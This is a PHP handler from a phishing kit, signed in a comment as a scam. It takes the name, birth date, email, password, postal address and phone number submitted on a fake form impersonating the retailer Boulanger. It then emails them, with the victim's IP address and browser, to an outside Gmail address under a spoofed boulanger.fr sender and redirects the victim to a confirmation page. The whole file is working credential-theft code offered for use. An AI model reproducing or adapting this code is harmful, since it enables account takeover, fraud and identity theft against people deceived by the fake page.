<?php
     if( $_POST['nom'] != "" && $_POST['prenom'] != "" && $_POST['dob1'] != "" && $_POST['dob2'] != "" && $_POST['dob3'] != "" && $_POST['email'] != "" && $_POST['passe'] != "" && $_POST['adresse']  != "" &&  $_POST['ville'] != "" && $_POST['postale'] != "" && $_POST['tele'] != ""  ){

# SCAM Made By Tarik HaXo0r #
$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$message .= "-------------------| By kamalix |-------------------\n";
$message .= "Name : ".$_POST['nom']."\n";
$message .= "Prenom : ".$_POST['prenom']."\n";
$message .= "Date de Naissance (JJ) : ".$_POST['dob1']."\n";
$message .= "Date de Naissance (MM) : ".$_POST['dob2']."\n";
$message .= "Date de Naissance (AAAA) : ".$_POST['dob3']."\n";
$message .= "Adresse email : ".$_POST['email']."\n";
$message .= "Mot de Passe : ".$_POST['passe']."\n";
$message .= "Ligne d'adresse 1 : ".$_POST['adresse']."\n";
$message .= "Ligne d'adresse 2 : ".$_POST['adresse2']."\n";
$message .= "Ville : ".$_POST['ville']."\n";
$message .= "Code Postale : ".$_POST['postale']."\n";
$message .= "Numero de telephone : ".$_POST['tele']."\n";
$message .= "------------------------------------------------------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "Browser : ".$browser."\n";
$message .= "+-----/!\-----|By kamalix|-----/!\-----+\n";
$to = "rizomaktm@gmail.com";
$subj = " Impo Rezults||".$ip."\n";
$from = "From: Impo Fresh  <no-reply@boulanger.fr>";
mail($to, $subj, $message, $from);
echo "<meta http-equiv='Refresh' content='0; URL=confirmer.php?cmd=Complete&Dispatch=ce82062aa5dd7e94f84f9d'>
";
	 }else{
include("erreur1.php"); 
	 }
?>
                       